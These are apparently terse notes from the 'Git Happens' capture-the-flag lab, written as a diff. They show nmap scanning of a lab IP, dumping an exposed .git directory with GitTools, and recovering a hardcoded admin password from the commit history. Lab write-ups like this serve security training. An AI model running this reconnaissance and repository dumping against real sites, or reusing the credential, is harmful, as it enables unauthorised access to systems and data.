@@ -1,0 +1,23 @@
+Git Happens
+
+Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!
+
+ping 10.10.234.189
+nmap -sV -sC -Pn -vv 10.10.234.189
+
+80
+
+10.10.234.189:80/.git/
+
+https://github.com/internetwache/GitTools
+
+cd GitTools 
+cd Dumper
+./gitdumper.sh http://10.10.234.189/.git/ clone
+cd clone
+git status
+git log
+git show 395e087334d613d5e423cdf8f7be27196a360459
+
++          username === "admin" &&
++          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
